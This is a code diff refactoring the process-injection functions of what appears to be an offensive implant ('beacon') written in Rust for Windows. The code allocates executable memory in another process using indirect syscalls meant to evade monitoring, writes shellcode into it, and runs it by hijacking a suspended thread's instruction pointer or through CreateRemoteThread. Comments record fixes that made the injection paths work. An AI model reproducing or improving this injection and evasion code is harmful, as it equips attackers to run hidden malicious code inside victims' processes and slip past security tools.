@@ -886,6 +886,36 @@ pub unsafe fn threadless_inject(
 ) -> Result<(), &'static str> {
     let rt = crate::syscalls::global().ok_or("indirect syscall runtime not initialized")?;
 
+    let remote_base = unsafe { threadless_inject_alloc(rt, proc_handle, shellcode) }?;
+    unsafe { threadless_inject_suspend(rt, main_thread) }?;
+    let mut ctx = unsafe { threadless_inject_context(rt, main_thread) }?;
+
+    // 5. Redirect RIP (offset 0x0F8) to the shellcode. On resume, the thread's
+    //    next instruction will be the first byte of the shellcode — pure RIP
+    //    hijack, no hardware breakpoint required.
+    //
+    //    v0.3.0 ALSO set DR0=sc_addr + DR7=0x1 (local execute breakpoint) with
+    //    the intent of "HWBP redirects execution." But an x64 execute breakpoint
+    //    traps BEFORE the instruction at DR0 runs (STATUS_SINGLE_STEP), and with
+    //    DR0 == RIP == sc_addr the very first instruction raises #DB before it
+    //    executes. There was no VEH registered in this path to redirect, so the
+    //    OS terminated the target on the first dispatch — CRITICAL-16 in
+    //    docs/audits/FULL_CODE_AUDIT_2026-07-21.md. The full threadless-inject
+    //    pattern (trigger_addr in a hot API, DR0=trigger, VEH redirect) is
+    //    future work; for v0.3.1 the RIP hijack alone is sufficient and correct.
+    let sc_addr = remote_base as u64;
+    ctx.0[0x0F8..0x0F8 + 8].copy_from_slice(&sc_addr.to_le_bytes());
+
+    unsafe { threadless_inject_apply(rt, main_thread, &mut ctx) }
+}
+
+/// Steps 1-2: allocate RWX in the target for the shellcode and write it via
+/// indirect syscalls. Returns the remote shellcode base.
+unsafe fn threadless_inject_alloc(
+    rt: &'static crate::syscalls::Runtime,
+    proc_handle: *mut core::ffi::c_void,
+    shellcode: &[u8],
+) -> Result<usize, &'static str> {
     // 1. Allocate RWX in target for shellcode.
     let mut remote_base: usize = 0;
     let mut region_size: usize = shellcode.len();
@@ -921,11 +951,17 @@ pub unsafe fn threadless_inject(
         Some(s) if s >= 0 => {}
         _ => return Err("NtWriteVirtualMemory shellcode failed"),
     }
+    Ok(remote_base)
+}
 
-    // 3. Suspend the main thread. Check the NTSTATUS — if suspend failed
-    //    (e.g. missing THREAD_SUSPEND_RESUME access) we MUST NOT proceed to
-    //    NtGetContextThread/NtSetContextThread on a live thread, which races
-    //    and can land a half-applied context mid-instruction.
+/// Step 3: suspend the main thread. Check the NTSTATUS — if suspend failed
+/// (e.g. missing THREAD_SUSPEND_RESUME access) we MUST NOT proceed to
+/// NtGetContextThread/NtSetContextThread on a live thread, which races
+/// and can land a half-applied context mid-instruction.
+unsafe fn threadless_inject_suspend(
+    rt: &'static crate::syscalls::Runtime,
+    main_thread: *mut core::ffi::c_void,
+) -> Result<(), &'static str> {
     let mut prev_count: u32 = 0;
     let susp_status =
         unsafe { crate::syscalls::nt_suspend_thread(rt, main_thread as usize, &mut prev_count) };
@@ -936,8 +972,15 @@ pub unsafe fn threadless_inject(
     if susp_status < 0 {
         return Err("NtSuspendThread failed");
     }
+    Ok(())
+}
 
-    // 4. Get thread CONTEXT (include debug registers for HWBP setup).
+/// Step 4: get the thread CONTEXT (include debug registers for HWBP setup).
+/// On failure the thread is resumed before returning Err.
+unsafe fn threadless_inject_context(
+    rt: &'static crate::syscalls::Runtime,
+    main_thread: *mut core::ffi::c_void,
+) -> Result<AlignedContext, &'static str> {
     let mut ctx = AlignedContext([0u8; 1232]);
     // CONTEXT_AMD64 | CONTEXT_CONTROL | CONTEXT_INTEGER | CONTEXT_DEBUG_REGISTERS
     ctx.0[0x30..0x34].copy_from_slice(&0x00100013u32.to_le_bytes());
@@ -961,24 +1004,16 @@ pub unsafe fn threadless_inject(
         unsafe { crate::syscalls::nt_resume_thread(rt, main_thread as usize, &mut dummy) };
         return Err("NtGetContextThread failed");
     }
+    Ok(ctx)
+}
 
-    // 5. Redirect RIP (offset 0x0F8) to the shellcode. On resume, the thread's
-    //    next instruction will be the first byte of the shellcode — pure RIP
-    //    hijack, no hardware breakpoint required.
-    //
-    //    v0.3.0 ALSO set DR0=sc_addr + DR7=0x1 (local execute breakpoint) with
-    //    the intent of "HWBP redirects execution." But an x64 execute breakpoint
-    //    traps BEFORE the instruction at DR0 runs (STATUS_SINGLE_STEP), and with
-    //    DR0 == RIP == sc_addr the very first instruction raises #DB before it
-    //    executes. There was no VEH registered in this path to redirect, so the
-    //    OS terminated the target on the first dispatch — CRITICAL-16 in
-    //    docs/audits/FULL_CODE_AUDIT_2026-07-21.md. The full threadless-inject
-    //    pattern (trigger_addr in a hot API, DR0=trigger, VEH redirect) is
-    //    future work; for v0.3.1 the RIP hijack alone is sufficient and correct.
-    let sc_addr = remote_base as u64;
-    ctx.0[0x0F8..0x0F8 + 8].copy_from_slice(&sc_addr.to_le_bytes());
-
-    // 6. Set modified context + resume.
+/// Step 6: set the modified context + resume. On failure the thread is
+/// resumed before returning Err.
+unsafe fn threadless_inject_apply(
+    rt: &'static crate::syscalls::Runtime,
+    main_thread: *mut core::ffi::c_void,
+    ctx: &mut AlignedContext,
+) -> Result<(), &'static str> {
     //    ContextFlags left as 0x00100013 (CONTEXT_AMD64 | CONTROL | INTEGER |
     //    DEBUG_REGISTERS) — harmless that DEBUG_REGISTERS is set; we just don't
     //    mutate any DR fields, so NtSetContextThread restores the thread's
@@ -1249,20 +1284,43 @@ pub fn do_inject(method: u8, pid: u32, spawn_to: &str, shellcode: &[u8]) -> nyx_
 /// # Safety
 /// Cross-process handle + memory operations. Single-threaded beacon context.
 unsafe fn inject_existing(pid: u32, shellcode: &[u8]) -> Result<(), &'static str> {
-    use core::ffi::c_void;
+    let fns = unsafe { inject_existing_resolve() }?;
+    // PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | QUERY
+    let h_proc = unsafe { (fns.op)(0x102A, 0, pid) };
+    if h_proc.is_null() || h_proc as usize == usize::MAX {
+        return Err("OpenProcess failed (pid/access)");
+    }
 
-    type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
-    type CreateRemoteThreadFn = unsafe extern "system" fn(
-        *mut c_void,
-        *mut c_void,
-        usize,
-        Option<unsafe extern "system" fn(*mut c_void) -> u32>,
-        *mut c_void,
-        u32,
-        *mut c_void,
-    ) -> *mut c_void;
-    type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
+    let rt = crate::syscalls::global().ok_or("syscall runtime down")?;
 
+    let remote_base = unsafe { inject_existing_stage_alloc(&fns, rt, h_proc, shellcode) }?;
+    unsafe { inject_existing_stage_thread(&fns, h_proc, remote_base) }?;
+
+    unsafe { (fns.ch)(h_proc) };
+    Ok(())
+}
+
+/// OpenProcess / CreateRemoteThread / CloseHandle resolved once per inject.
+struct InjectFns {
+    op: OpenProcessFn,
+    crt: CreateRemoteThreadFn,
+    ch: CloseHandleFn,
+}
+
+type OpenProcessFn = unsafe extern "system" fn(u32, i32, u32) -> *mut c_void;
+type CreateRemoteThreadFn = unsafe extern "system" fn(
+    *mut c_void,
+    *mut c_void,
+    usize,
+    Option<unsafe extern "system" fn(*mut c_void) -> u32>,
+    *mut c_void,
+    u32,
+    *mut c_void,
+) -> *mut c_void;
+type CloseHandleFn = unsafe extern "system" fn(*mut c_void) -> i32;
+
+/// Resolve + transmute OpenProcess / CreateRemoteThread / CloseHandle.
+unsafe fn inject_existing_resolve() -> Result<InjectFns, &'static str> {
     let op: OpenProcessFn = match export_addr(b"kernel32.dll", b"OpenProcess") {
         Some(a) => unsafe { core::mem::transmute(a) },
         None => return Err("OpenProcess unresolved"),
@@ -1275,15 +1333,17 @@ unsafe fn inject_existing(pid: u32, shellcode: &[u8]) -> Result<(), &'static str
         Some(a) => unsafe { core::mem::transmute(a) },
         None => return Err("CloseHandle unresolved"),
     };
+    Ok(InjectFns { op, crt, ch })
+}
 
-    // PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | QUERY
-    let h_proc = unsafe { op(0x102A, 0, pid) };
-    if h_proc.is_null() || h_proc as usize == usize::MAX {
-        return Err("OpenProcess failed (pid/access)");
-    }
-
-    let rt = crate::syscalls::global().ok_or("syscall runtime down")?;
-
+/// Steps 1-2: allocate RWX in the target via indirect syscall + write the
+/// shellcode. On failure the process handle is closed here.
+unsafe fn inject_existing_stage_alloc(
+    fns: &InjectFns,
+    rt: &'static crate::syscalls::Runtime,
+    h_proc: *mut core::ffi::c_void,
+    shellcode: &[u8],
+) -> Result<usize, &'static str> {
     // 1. Allocate RWX in target via indirect syscall.
     let mut remote_base: usize = 0;
     let mut region_size: usize = shellcode.len();
@@ -1299,7 +1359,7 @@ unsafe fn inject_existing(pid: u32, shellcode: &[u8]) -> Result<(), &'static str
         )
     };
     if alloc_status.map_or(true, |s| s < 0) {
-        unsafe { ch(h_proc) };
+        unsafe { (fns.ch)(h_proc) };
         return Err("remote alloc failed");
     }
 
@@ -1316,25 +1376,33 @@ unsafe fn inject_existing(pid: u32, shellcode: &[u8]) -> Result<(), &'static str
         )
     };
     if write_status.map_or(true, |s| s < 0) {
-        unsafe { ch(h_proc) };
+        unsafe { (fns.ch)(h_proc) };
         return Err("remote write failed");
     }
+    Ok(remote_base)
+}
 
-    // 3. CreateRemoteThread with lpStartAddress = shellcode base.
-    //
-    //    v0.3.0 passed None for lpStartAddress and the shellcode address as
-    //    lpParameter (arg 5) — the kernel rejects a NULL start address and the
-    //    call always returned NULL, so the primary existing-process inject path
-    //    was 100% broken (always hit the 'CreateRemoteThread failed' arm).
-    //    CRITICAL-14 in docs/audits/FULL_CODE_AUDIT_2026-07-21.md.
-    //
-    //    Fix mirrors the working remote_load_library pattern at inject.rs:331:
-    //    wrap a transmuted function pointer in Some(...) for arg 4, pass null
-    //    for arg 5 (our shellcode takes no parameter).
+/// Step 3: CreateRemoteThread with lpStartAddress = the shellcode base. On
+/// failure the process handle is closed here.
+///
+/// v0.3.0 passed None for lpStartAddress and the shellcode address as
+/// lpParameter (arg 5) — the kernel rejects a NULL start address and the
+/// call always returned NULL, so the primary existing-process inject path
+/// was 100% broken (always hit the 'CreateRemoteThread failed' arm).
+/// CRITICAL-14 in docs/audits/FULL_CODE_AUDIT_2026-07-21.md.
+///
+/// Fix mirrors the working remote_load_library pattern at inject.rs:331:
+/// wrap a transmuted function pointer in Some(...) for arg 4, pass null
+/// for arg 5 (our shellcode takes no parameter).
+unsafe fn inject_existing_stage_thread(
+    fns: &InjectFns,
+    h_proc: *mut core::ffi::c_void,
+    remote_base: usize,
+) -> Result<(), &'static str> {
     type ThreadProc = unsafe extern "system" fn(*mut c_void) -> u32;
     let start_proc: ThreadProc = unsafe { core::mem::transmute(remote_base) };
     let h_thread = unsafe {
-        crt(
+        (fns.crt)(
             h_proc,
             core::ptr::null_mut(),
             0,
@@ -1345,11 +1413,10 @@ unsafe fn inject_existing(pid: u32, shellcode: &[u8]) -> Result<(), &'static str
         )
     };
     if h_thread.is_null() {
-        unsafe { ch(h_proc) };
+        unsafe { (fns.ch)(h_proc) };
         return Err("CreateRemoteThread failed");
     }
 
-    unsafe { ch(h_thread) };
-    unsafe { ch(h_proc) };
+    unsafe { (fns.ch)(h_thread) };
     Ok(())
 }
